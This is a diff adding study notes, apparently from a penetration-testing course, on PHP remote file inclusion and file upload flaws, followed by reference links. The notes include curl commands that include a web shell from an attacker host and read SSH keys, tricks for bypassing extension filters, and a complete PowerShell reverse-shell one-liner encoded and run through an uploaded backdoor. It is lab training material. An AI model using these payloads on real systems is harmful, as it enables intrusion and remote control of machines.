@@ -153,13 +153,74 @@ with the filter wrapper, its basically showing the code as it would look like if
 
 
 ### 9.2.3. Remote File Inclusion (RFI)
+php applications need allow_url_include enabled for RFI (data:// needs it as well)
+RFI let you point at files not on the machine.. eg an attacker's server via http or smb. Can also be pointed at a public file like one at github
 
+RFI is discoverable using the same techniques as LFI or Directory Traversal
+
+Kali has a bunch of php web shells for RFI
+/usr/share/webshells/php/
+
+python -m http.server 80
+curl "http://mountaindesserts.com/meteor/index.php?page=http://<ATTACKER>/simple-backdoor.php&cmd=ls"
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.228/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
+
+### 9.3. File Upload Vulnerabilities
+3 types of FU vulns
+1) We can upload files that are executed by the web app -- then just access using burp or curl
+2) We can upload but need to use another vulnerability for it to run -- example in Directory traversal attack, try to upload to a file that already exists such as authorized_keys
+3) we can upload a file but need a victim/another personto access the file
+
+### 9.3.1. Using Executable Files
+
+You can bypass php extension filter by using less common php extensions such as .phps or .php7 or by capitalizing letters e.g .pHP instead of .php
+If there is a rename feature, you can also upload the file, then rename it after the fact
+
+you can use powershell on kali
+pwsh
+
+create variable called Text which has powershell oneliner for reverse shell
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+encode oneliner
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+
+send curl request to simple-backdoor which takes a a command
+
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20SOMEBASE64PAYLOAD
+powershell -enc: allows powershell to parse base64 payloads
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
+9.3.1. Using Executable Files
+https://en.wikipedia.org/wiki/Content_management_system
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+https://adsecurity.org/?p=478
+https://www.base64encode.org/
+https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.convert
+https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.unicode
+https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding
+https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe
+
+
+9.3. File Upload Vulnerabilities
+https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+https://owasp.org/www-community/attacks/xss/
+https://developer.mozilla.org/en-US/docs/Web/SVG
+https://docs.microsoft.com/en-us/openspecs/office_standards/ms-docx/
+https://support.microsoft.com/en-us/office/macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6
+
+9.2.3. Remote File Inclusion (RFI)
+https://developer.mozilla.org/en-US/docs/Web/HTTP
+https://en.wikipedia.org/wiki/Server_Message_Block
+https://docs.python.org/3/
+https://docs.python.org/3/library/http.server.html
+
 9.2.2. PHP Wrappers
 https://www.php.net/manual/en/wrappers.php.php
 https://www.php.net/manual/en/wrappers.data.php
